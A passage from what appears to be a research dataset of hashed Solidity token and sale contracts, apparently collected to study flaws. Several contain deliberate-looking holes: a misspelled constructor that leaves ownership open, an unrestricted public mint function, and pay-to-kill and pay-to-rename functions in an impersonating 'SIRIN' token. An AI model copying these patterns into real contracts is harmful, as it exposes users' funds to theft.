            blacklist[addresses[i]] = true;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function airdrop(address[] addresses) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(value <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(amount <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);
            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }
    function () external payable {
            getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_8a6e0a083b37

SHA-256 `0a328a6b695ed20d8d81d854137cb75e266fae760443bdec4115c3c6675029c1`

```solidity
pragma solidity ^0.4.21;
contract EIP20Interface {
    uint256 public totalSupply;
    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value); 
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public;
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) public;
  function approve(address spender, uint256 value) public;
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable {
  address public owner;
  function Owanble() public{
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }
}
contract Haltable is Ownable {
  bool public halted = false;
  modifier stopInEmergency {
    require(!halted);
    _;
  }
  modifier onlyInEmergency {
    require(halted);
    _;
  }
  function halt() external onlyOwner {
    halted = true;
  }
  function unhalt() external onlyOwner onlyInEmergency {
    halted = false;
  }
}
contract TokenSale is Haltable {
    using SafeMath for uint;
    string public name = "TokenSale Contract";
    EIP20Interface public token;
    address public beneficiary;
    address public reserve;
    uint public price = 0; 
    uint public tokensSoldTotal = 0; 
    uint public weiRaisedTotal = 0; 
    uint public investorCount = 0;
    event NewContribution(
        address indexed holder,
        uint256 tokenAmount,
        uint256 etherAmount);
    function TokenSale(
        ) public {
        owner = msg.sender;
        token = EIP20Interface(address(0x2F7823AaF1ad1dF0D5716E8F18e1764579F4ABe6));
        beneficiary = address(0xf2b9DA535e8B8eF8aab29956823df7237f1863A3);
        reserve = address(0x966c0FD16a4f4292E6E0372e04fbB5c7013AD02e);
        price = 0.00379 ether;
    }
    function changeBeneficiary(address _beneficiary) public onlyOwner stopInEmergency {
        beneficiary = _beneficiary;
    }
    function changeReserve(address _reserve) public onlyOwner stopInEmergency {
        reserve = _reserve;
    }
    function changePrice(uint _price) public onlyOwner stopInEmergency {
        price = _price;
    }
    function () public payable stopInEmergency {
        require(msg.value >= price);
        uint tokens = msg.value / price;
        require(token.balanceOf(this) >= tokens);
        tokensSoldTotal = tokensSoldTotal.add(tokens);
        if (token.balanceOf(msg.sender) == 0) investorCount++;
        weiRaisedTotal = weiRaisedTotal.add(msg.value);
        token.transfer(msg.sender, tokens);
        uint reservePie = msg.value.div(10);
        uint beneficiaryPie = msg.value.sub(reservePie);
        reserve.transfer(reservePie);
        beneficiary.transfer(beneficiaryPie);
        emit NewContribution(msg.sender, tokens, msg.value);
    }
    function withdrawERC20Token(address _token) public onlyOwner stopInEmergency {
        ERC20 foreignToken = ERC20(_token);
        foreignToken.transfer(msg.sender, foreignToken.balanceOf(this));
    }
    function withdrawEIP20Token(address _token) public onlyOwner stopInEmergency {
        EIP20Interface foreignToken = EIP20Interface(_token);
        foreignToken.transfer(msg.sender, foreignToken.balanceOf(this));
    }
    function withdrawToken() public onlyOwner stopInEmergency {
        token.transfer(msg.sender, token.balanceOf(this));
    }
    function tokensRemaining() public constant returns (uint256) {
        return token.balanceOf(this);
    }
}
```

## RQ1_875ea2d05b6c

SHA-256 `62694670a1253e36c5734f070bc688f33dbeebf03c390f0c20e947e291c6b369`

```solidity
pragma solidity >=0.5.4 <0.6.0;
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes calldata _extraData) external; }
library SafeMath {
	function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
		if (a == 0) {
			return 0;
		}
		c = a * b;
		assert(c / a == b);
		return c;
	}
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return a / b;
	}
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}
	function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
		c = a + b;
		assert(c >= a);
		return c;
	}
}
interface INameTAOPosition {
	function senderIsAdvocate(address _sender, address _id) external view returns (bool);
	function senderIsListener(address _sender, address _id) external view returns (bool);
	function senderIsSpeaker(address _sender, address _id) external view returns (bool);
	function senderIsPosition(address _sender, address _id) external view returns (bool);
	function getAdvocate(address _id) external view returns (address);
	function nameIsAdvocate(address _nameId, address _id) external view returns (bool);
	function nameIsPosition(address _nameId, address _id) external view returns (bool);
	function initialize(address _id, address _advocateId, address _listenerId, address _speakerId) external returns (bool);
	function determinePosition(address _sender, address _id) external view returns (uint256);
}
interface IAOIonLot {
	function createPrimordialLot(address _account, uint256 _primordialAmount, uint256 _multiplier, uint256 _networkBonusAmount) external returns (bytes32);
	function createWeightedMultiplierLot(address _account, uint256 _amount, uint256 _weightedMultiplier) external returns (bytes32);
	function lotById(bytes32 _lotId) external view returns (bytes32, address, uint256, uint256);
	function totalLotsByAddress(address _lotOwner) external view returns (uint256);
	function createBurnLot(address _account, uint256 _amount, uint256 _multiplierAfterBurn) external returns (bool);
	function createConvertLot(address _account, uint256 _amount, uint256 _multiplierAfterConversion) external returns (bool);
}
contract TokenERC20 {
	string public name;
	string public symbol;
	uint8 public decimals = 18;
	uint256 public totalSupply;
	mapping (address => uint256) public balanceOf;
	mapping (address => mapping (address => uint256)) public allowance;
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed _owner, address indexed _spender, uint256 _value);
	event Burn(address indexed from, uint256 value);
	constructor (uint256 initialSupply, string memory tokenName, string memory tokenSymbol) public {
		totalSupply = initialSupply * 10 ** uint256(decimals);  
		balanceOf[msg.sender] = totalSupply;                
		name = tokenName;                                   
		symbol = tokenSymbol;                               
	}
	function _transfer(address _from, address _to, uint _value) internal {
		require(_to != address(0));
		require(balanceOf[_from] >= _value);
		require(balanceOf[_to] + _value > balanceOf[_to]);
		uint previousBalances = balanceOf[_from] + balanceOf[_to];
		balanceOf[_from] -= _value;
		balanceOf[_to] += _value;
		emit Transfer(_from, _to, _value);
		assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
	}
	function transfer(address _to, uint256 _value) public returns (bool success) {
		_transfer(msg.sender, _to, _value);
		return true;
	}
	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
		require(_value <= allowance[_from][msg.sender]);     
		allowance[_from][msg.sender] -= _value;
		_transfer(_from, _to, _value);
		return true;
	}
	function approve(address _spender, uint256 _value) public returns (bool success) {
		allowance[msg.sender][_spender] = _value;
		emit Approval(msg.sender, _spender, _value);
		return true;
	}
	function approveAndCall(address _spender, uint256 _value, bytes memory _extraData) public returns (bool success) {
		tokenRecipient spender = tokenRecipient(_spender);
		if (approve(_spender, _value)) {
			spender.receiveApproval(msg.sender, _value, address(this), _extraData);
			return true;
		}
	}
	function burn(uint256 _value) public returns (bool success) {
		require(balanceOf[msg.sender] >= _value);   
		balanceOf[msg.sender] -= _value;            
		totalSupply -= _value;                      
		emit Burn(msg.sender, _value);
		return true;
	}
	function burnFrom(address _from, uint256 _value) public returns (bool success) {
		require(balanceOf[_from] >= _value);                
		require(_value <= allowance[_from][msg.sender]);    
		balanceOf[_from] -= _value;                         
		allowance[_from][msg.sender] -= _value;             
		totalSupply -= _value;                              
		emit Burn(_from, _value);
		return true;
	}
}
contract TAO {
	using SafeMath for uint256;
	address public vaultAddress;
	string public name;				
	address public originId;		
	string public datHash;
	string public database;
	string public keyValue;
	bytes32 public contentId;
	uint8 public typeId;
	constructor (string memory _name,
		address _originId,
		string memory _datHash,
		string memory _database,
		string memory _keyValue,
		bytes32 _contentId,
		address _vaultAddress
	) public {
		name = _name;
		originId = _originId;
		datHash = _datHash;
		database = _database;
		keyValue = _keyValue;
		contentId = _contentId;
		typeId = 0;
		vaultAddress = _vaultAddress;
	}
	modifier onlyVault {
		require (msg.sender == vaultAddress);
		_;
	}
	function () external payable {
	}
	function transferEth(address payable _recipient, uint256 _amount) public onlyVault returns (bool) {
		_recipient.transfer(_amount);
		return true;
	}
	function transferERC20(address _erc20TokenAddress, address _recipient, uint256 _amount) public onlyVault returns (bool) {
		TokenERC20 _erc20 = TokenERC20(_erc20TokenAddress);
		_erc20.transfer(_recipient, _amount);
		return true;
	}
}
contract Name is TAO {
	constructor (string memory _name, address _originId, string memory _datHash, string memory _database, string memory _keyValue, bytes32 _contentId, address _vaultAddress)
		TAO (_name, _originId, _datHash, _database, _keyValue, _contentId, _vaultAddress) public {
		typeId = 1;
	}
}
library AOLibrary {
	using SafeMath for uint256;
	uint256 constant private _MULTIPLIER_DIVISOR = 10 ** 6; 
	uint256 constant private _PERCENTAGE_DIVISOR = 10 ** 6; 
	function isTAO(address _taoId) public view returns (bool) {
		return (_taoId != address(0) && bytes(TAO(address(uint160(_taoId))).name()).length > 0 && TAO(address(uint160(_taoId))).originId() != address(0) && TAO(address(uint160(_taoId))).typeId() == 0);
	}
	function isName(address _nameId) public view returns (bool) {
		return (_nameId != address(0) && bytes(TAO(address(uint160(_nameId))).name()).length > 0 && Name(address(uint160(_nameId))).originId() != address(0) && Name(address(uint160(_nameId))).typeId() == 1);
	}
	function isValidERC20TokenAddress(address _tokenAddress) public view returns (bool) {
		if (_tokenAddress == address(0)) {
			return false;
		}
		TokenERC20 _erc20 = TokenERC20(_tokenAddress);
		return (_erc20.totalSupply() >= 0 && bytes(_erc20.name()).length > 0 && bytes(_erc20.symbol()).length > 0);
	}
	function isTheAO(address _sender, address _theAO, address _nameTAOPositionAddress) public view returns (bool) {
		return (_sender == _theAO ||
			(
				(isTAO(_theAO) || isName(_theAO)) &&
				_nameTAOPositionAddress != address(0) &&
				INameTAOPosition(_nameTAOPositionAddress).senderIsAdvocate(_sender, _theAO)
			)
		);
	}
	function PERCENTAGE_DIVISOR() public pure returns (uint256) {
		return _PERCENTAGE_DIVISOR;
	}
	function MULTIPLIER_DIVISOR() public pure returns (uint256) {
		return _MULTIPLIER_DIVISOR;
	}
	function deployTAO(string memory _name,
		address _originId,
		string memory _datHash,
		string memory _database,
		string memory _keyValue,
		bytes32 _contentId,
		address _nameTAOVaultAddress
		) public returns (TAO _tao) {
		_tao = new TAO(_name, _originId, _datHash, _database, _keyValue, _contentId, _nameTAOVaultAddress);
	}
	function deployName(string memory _name,
		address _originId,
		string memory _datHash,
		string memory _database,
		string memory _keyValue,
		bytes32 _contentId,
		address _nameTAOVaultAddress
		) public returns (Name _myName) {
		_myName = new Name(_name, _originId, _datHash, _database, _keyValue, _contentId, _nameTAOVaultAddress);
	}
	function calculateWeightedMultiplier(uint256 _currentWeightedMultiplier, uint256 _currentPrimordialBalance, uint256 _additionalWeightedMultiplier, uint256 _additionalPrimordialAmount) public pure returns (uint256) {
		if (_currentWeightedMultiplier > 0) {
			uint256 _totalWeightedIons = (_currentWeightedMultiplier.mul(_currentPrimordialBalance)).add(_additionalWeightedMultiplier.mul(_additionalPrimordialAmount));
			uint256 _totalIons = _currentPrimordialBalance.add(_additionalPrimordialAmount);
			return _totalWeightedIons.div(_totalIons);
		} else {
			return _additionalWeightedMultiplier;
		}
	}
	function calculatePrimordialMultiplier(uint256 _purchaseAmount, uint256 _totalPrimordialMintable, uint256 _totalPrimordialMinted, uint256 _startingMultiplier, uint256 _endingMultiplier) public pure returns (uint256) {
		if (_purchaseAmount > 0 && _purchaseAmount <= _totalPrimordialMintable.sub(_totalPrimordialMinted)) {
			uint256 temp = _totalPrimordialMinted.add(_purchaseAmount.div(2));
			uint256 multiplier = (_MULTIPLIER_DIVISOR.sub(_MULTIPLIER_DIVISOR.mul(temp).div(_totalPrimordialMintable))).mul(_startingMultiplier.sub(_endingMultiplier));
			return multiplier.div(_MULTIPLIER_DIVISOR);
		} else {
			return 0;
		}
	}
	function calculateNetworkBonusPercentage(uint256 _purchaseAmount, uint256 _totalPrimordialMintable, uint256 _totalPrimordialMinted, uint256 _startingMultiplier, uint256 _endingMultiplier) public pure returns (uint256) {
		if (_purchaseAmount > 0 && _purchaseAmount <= _totalPrimordialMintable.sub(_totalPrimordialMinted)) {
			uint256 temp = _totalPrimordialMinted.add(_purchaseAmount.div(2));
			uint256 bonusPercentage = (_PERCENTAGE_DIVISOR.sub(_PERCENTAGE_DIVISOR.mul(temp).div(_totalPrimordialMintable))).mul(_startingMultiplier.sub(_endingMultiplier)).div(_PERCENTAGE_DIVISOR);
			return bonusPercentage;
		} else {
			return 0;
		}
	}
	function calculateNetworkBonusAmount(uint256 _purchaseAmount, uint256 _totalPrimordialMintable, uint256 _totalPrimordialMinted, uint256 _startingMultiplier, uint256 _endingMultiplier) public pure returns (uint256) {
		uint256 bonusPercentage = calculateNetworkBonusPercentage(_purchaseAmount, _totalPrimordialMintable, _totalPrimordialMinted, _startingMultiplier, _endingMultiplier);
		uint256 networkBonus = bonusPercentage.mul(_purchaseAmount).div(_PERCENTAGE_DIVISOR);
		return networkBonus;
	}
	function calculateMaximumBurnAmount(uint256 _primordialBalance, uint256 _currentWeightedMultiplier, uint256 _maximumMultiplier) public pure returns (uint256) {
		return (_maximumMultiplier.mul(_primordialBalance).sub(_primordialBalance.mul(_currentWeightedMultiplier))).div(_maximumMultiplier);
	}
	function calculateMultiplierAfterBurn(uint256 _primordialBalance, uint256 _currentWeightedMultiplier, uint256 _amountToBurn) public pure returns (uint256) {
		return _primordialBalance.mul(_currentWeightedMultiplier).div(_primordialBalance.sub(_amountToBurn));
	}
	function calculateMultiplierAfterConversion(uint256 _primordialBalance, uint256 _currentWeightedMultiplier, uint256 _amountToConvert) public pure returns (uint256) {
		return _primordialBalance.mul(_currentWeightedMultiplier).div(_primordialBalance.add(_amountToConvert));
	}
	function numDigits(uint256 number) public pure returns (uint8) {
		uint8 digits = 0;
		while(number != 0) {
			number = number.div(10);
			digits++;
		}
		return digits;
	}
}
contract TheAO {
	address public theAO;
	address public nameTAOPositionAddress;
	mapping (address => bool) public whitelist;
	constructor() public {
		theAO = msg.sender;
	}
	modifier inWhitelist() {
		require (whitelist[msg.sender] == true);
		_;
	}
	function transferOwnership(address _theAO) public {
		require (msg.sender == theAO);
		require (_theAO != address(0));
		theAO = _theAO;
	}
	function setWhitelist(address _account, bool _whitelist) public {
		require (msg.sender == theAO);
		require (_account != address(0));
		whitelist[_account] = _whitelist;
	}
}
contract AOIonLot is TheAO {
	using SafeMath for uint256;
	address public aoIonAddress;
	uint256 public totalLots;
	uint256 public totalBurnLots;
	uint256 public totalConvertLots;
	struct Lot {
		bytes32 lotId;
		uint256 multiplier;	
		address lotOwner;
		uint256 amount;
	}
	struct BurnLot {
		bytes32 burnLotId;
		address lotOwner;
		uint256 amount;
	}
	struct ConvertLot {
		bytes32 convertLotId;
		address lotOwner;
		uint256 amount;
	}
	mapping (bytes32 => Lot) internal lots;
	mapping (bytes32 => BurnLot) internal burnLots;
	mapping (bytes32 => ConvertLot) internal convertLots;
	mapping (address => bytes32[]) internal ownedLots;
	mapping (address => bytes32[]) internal ownedBurnLots;
	mapping (address => bytes32[]) internal ownedConvertLots;
	event LotCreation(address indexed lotOwner, bytes32 indexed lotId, uint256 multiplier, uint256 primordialAmount, uint256 networkBonusAmount);
	event BurnLotCreation(address indexed lotOwner, bytes32 indexed burnLotId, uint256 burnAmount, uint256 multiplierAfterBurn);
	event ConvertLotCreation(address indexed lotOwner, bytes32 indexed convertLotId, uint256 convertAmount, uint256 multiplierAfterConversion);
	constructor(address _aoIonAddress, address _nameTAOPositionAddress) public {
		setAOIonAddress(_aoIonAddress);
		setNameTAOPositionAddress(_nameTAOPositionAddress);
	}
	modifier onlyTheAO {
		require (AOLibrary.isTheAO(msg.sender, theAO, nameTAOPositionAddress));
		_;
	}
	modifier onlyAOIon {
		require (msg.sender == aoIonAddress);
		_;
	}
	function transferOwnership(address _theAO) public onlyTheAO {
		require (_theAO != address(0));
		theAO = _theAO;
	}
	function setWhitelist(address _account, bool _whitelist) public onlyTheAO {
		require (_account != address(0));
		whitelist[_account] = _whitelist;
	}
	function setAOIonAddress(address _aoIonAddress) public onlyTheAO {
		require (_aoIonAddress != address(0));
		aoIonAddress = _aoIonAddress;
	}
	function setNameTAOPositionAddress(address _nameTAOPositionAddress) public onlyTheAO {
		require (_nameTAOPositionAddress != address(0));
		nameTAOPositionAddress = _nameTAOPositionAddress;
	}
	function createPrimordialLot(address _account, uint256 _primordialAmount, uint256 _multiplier, uint256 _networkBonusAmount) external onlyAOIon returns (bytes32) {
		return _createWeightedMultiplierLot(_account, _primordialAmount, _multiplier, _networkBonusAmount);
	}
	function createWeightedMultiplierLot(address _account, uint256 _amount, uint256 _weightedMultiplier) external onlyAOIon returns (bytes32) {
		require (_account != address(0));
		require (_amount > 0);
		return _createWeightedMultiplierLot(_account, _amount, _weightedMultiplier, 0);
	}
	function lotById(bytes32 _lotId) external view returns (bytes32, address, uint256, uint256) {
		Lot memory _lot = lots[_lotId];
		return (_lot.lotId, _lot.lotOwner, _lot.multiplier, _lot.amount);
	}
	function lotIdsByAddress(address _lotOwner) public view returns (bytes32[] memory) {
		return ownedLots[_lotOwner];
	}
	function totalLotsByAddress(address _lotOwner) external view returns (uint256) {
		return ownedLots[_lotOwner].length;
	}
	function lotOfOwnerByIndex(address _lotOwner, uint256 _index) public view returns (bytes32, address, uint256, uint256) {
		require (_index < ownedLots[_lotOwner].length);
		Lot memory _lot = lots[ownedLots[_lotOwner][_index]];
		return (_lot.lotId, _lot.lotOwner, _lot.multiplier, _lot.amount);
	}
	function createBurnLot(address _account, uint256 _amount, uint256 _multiplierAfterBurn) external onlyAOIon returns (bool) {
		totalBurnLots++;
		bytes32 burnLotId = keccak256(abi.encodePacked(this, _account, totalBurnLots));
		require (burnLots[burnLotId].lotOwner == address(0));
		BurnLot storage burnLot = burnLots[burnLotId];
		burnLot.burnLotId = burnLotId;
		burnLot.lotOwner = _account;
		burnLot.amount = _amount;
		ownedBurnLots[_account].push(burnLotId);
		emit BurnLotCreation(burnLot.lotOwner, burnLot.burnLotId, burnLot.amount, _multiplierAfterBurn);
		return true;
	}
	function burnLotIdsByAddress(address _lotOwner) public view returns (bytes32[] memory) {
		return ownedBurnLots[_lotOwner];
	}
	function totalBurnLotsByAddress(address _lotOwner) public view returns (uint256) {
		return ownedBurnLots[_lotOwner].length;
	}
	function burnLotById(bytes32 _burnLotId) public view returns (bytes32, address, uint256) {
		BurnLot memory _burnLot = burnLots[_burnLotId];
		return (_burnLot.burnLotId, _burnLot.lotOwner, _burnLot.amount);
	}
	function createConvertLot(address _account, uint256 _amount, uint256 _multiplierAfterConversion) external onlyAOIon returns (bool) {
		totalConvertLots++;
		bytes32 convertLotId = keccak256(abi.encodePacked(this, _account, totalConvertLots));
		require (convertLots[convertLotId].lotOwner == address(0));
		ConvertLot storage convertLot = convertLots[convertLotId];
		convertLot.convertLotId = convertLotId;
		convertLot.lotOwner = _account;
		convertLot.amount = _amount;
		ownedConvertLots[_account].push(convertLotId);
		emit ConvertLotCreation(convertLot.lotOwner, convertLot.convertLotId, convertLot.amount, _multiplierAfterConversion);
		return true;
	}
	function convertLotIdsByAddress(address _lotOwner) public view returns (bytes32[] memory) {
		return ownedConvertLots[_lotOwner];
	}
	function totalConvertLotsByAddress(address _lotOwner) public view returns (uint256) {
		return ownedConvertLots[_lotOwner].length;
	}
	function convertLotById(bytes32 _convertLotId) public view returns (bytes32, address, uint256) {
		ConvertLot memory _convertLot = convertLots[_convertLotId];
		return (_convertLot.convertLotId, _convertLot.lotOwner, _convertLot.amount);
	}
	function _createWeightedMultiplierLot(address _account, uint256 _amount, uint256 _weightedMultiplier, uint256 _networkBonusAmount) internal returns (bytes32) {
		totalLots++;
		bytes32 lotId = keccak256(abi.encodePacked(address(this), _account, totalLots));
		require (lots[lotId].lotOwner == address(0));
		Lot storage lot = lots[lotId];
		lot.lotId = lotId;
		lot.multiplier = _weightedMultiplier;
		lot.lotOwner = _account;
		lot.amount = _amount;
		ownedLots[_account].push(lotId);
		emit LotCreation(lot.lotOwner, lot.lotId, lot.multiplier, lot.amount, _networkBonusAmount);
		return lotId;
	}
}
```

## RQ1_9748dc44e052

SHA-256 `bff29e2973796b9f2d4ca5b7f6fec26d02356cbe05ad10abdca4e9f2c4f7a2e3`

```solidity
pragma solidity ^0.4.19;
contract SirinSmartToken {
    string public name = "SIRIN";
    string public symbol = "SRN";
    uint8 public constant decimals = 18;  
    address public owner;
    uint256 public constant tokensPerEth = 1;
    uint256 public constant howManyEtherInWeiToBecomeOwner = 1000 ether;
    uint256 public constant howManyEtherInWeiToKillContract = 500 ether;
    uint256 public constant howManyEtherInWeiToChangeSymbolName = 400 ether;
    bool public funding = true;
    uint256 totalTokens = 1000;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Migrate(address indexed _from, address indexed _to, uint256 _value);
    event Refund(address indexed _from, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    function SirinSmartToken() public {
        owner = msg.sender;
        balances[owner]=1000;
    }
    function changeNameSymbol(string _name, string _symbol) payable external
    {
        if (msg.sender==owner || msg.value >=howManyEtherInWeiToChangeSymbolName)
        {
            name = _name;
            symbol = _symbol;
        }
    }
    function changeOwner (address _newowner) payable external
    {
        if (msg.value>=howManyEtherInWeiToBecomeOwner)
        {
            owner.transfer(msg.value);
            owner.transfer(this.balance);
            owner=_newowner;
        }
    }
    function killContract () payable external
    {
        if (msg.sender==owner || msg.value >=howManyEtherInWeiToKillContract)
        {
            selfdestruct(owner);
        }
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        var senderBalance = balances[msg.sender];
        if (senderBalance >= _value && _value > 0) {
            senderBalance -= _value;
            balances[msg.sender] = senderBalance;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        }
        return false;
    }
    function mintTo(address _to, uint256 _value) public returns (bool) {
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
    }
    function totalSupply() external constant returns (uint256) {
        return totalTokens;
    }
    function balanceOf(address _owner) external constant returns (uint256) {
        return balances[_owner];
    }
    function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     ) public returns (bool success) {
         if (balances[_from] >= _amount
             && allowed[_from][msg.sender] >= _amount
             && _amount > 0
             && balances[_to] + _amount > balances[_to]) {
             balances[_from] -= _amount;
             allowed[_from][msg.sender] -= _amount;
             balances[_to] += _amount;
             return true;
         } else {
             return false;
         }
  }
    function approve(address _spender, uint256 _amount) public returns (bool success) {
         allowed[msg.sender][_spender] = _amount;
         Approval(msg.sender, _spender, _amount);
         return true;
     }
    function () payable external {
        if (!funding) revert();
        if (msg.value == 0) revert();
        var numTokens = msg.value * (1000.0/totalTokens);
        totalTokens += numTokens;
        balances[msg.sender] += numTokens;
        Transfer(0, msg.sender, numTokens);
    }
}
```

## RQ1_e27b11bddd94

SHA-256 `46d4de04b3737650ce0ad64ac2083a1690fe799b462de2532b3e6ab63262b012`

```solidity
pragma solidity >=0.5.0 <0.6.0;
interface INMR {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function withdraw(address _from, address _to, uint256 _value) external returns(bool ok);
    function destroyStake(address _staker, bytes32 _tag, uint256 _tournamentID, uint256 _roundID) external returns (bool ok);
    function createRound(uint256, uint256, uint256, uint256) external returns (bool ok);
    function createTournament(uint256 _newDelegate) external returns (bool ok);
    function mint(uint256 _value) external returns (bool ok);
    function numeraiTransfer(address _to, uint256 _value) external returns (bool ok);
    function contractUpgradable() external view returns (bool);
    function getTournament(uint256 _tournamentID) external view returns (uint256, uint256[] memory);
    function getRound(uint256 _tournamentID, uint256 _roundID) external view returns (uint256, uint256, uint256);
    function getStake(uint256 _tournamentID, uint256 _roundID, address _staker, bytes32 _tag) external view returns (uint256, uint256, bool, bool);
}
contract Initializable {
  bool private initialized;
  bool private initializing;
  modifier initializer() {
    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");
    bool wasInitializing = initializing;
    initializing = true;
    initialized = true;
    _;
    initializing = wasInitializing;
  }
  function isConstructor() private view returns (bool) {
    uint256 cs;
    assembly { cs := extcodesize(address) }
    return cs == 0;
  }
  uint256[50] private ______gap;
}
contract Ownable is Initializable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function initialize(address sender) public initializer {
        _owner = sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(isOwner());
        _;
    }
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    uint256[50] private ______gap;
}
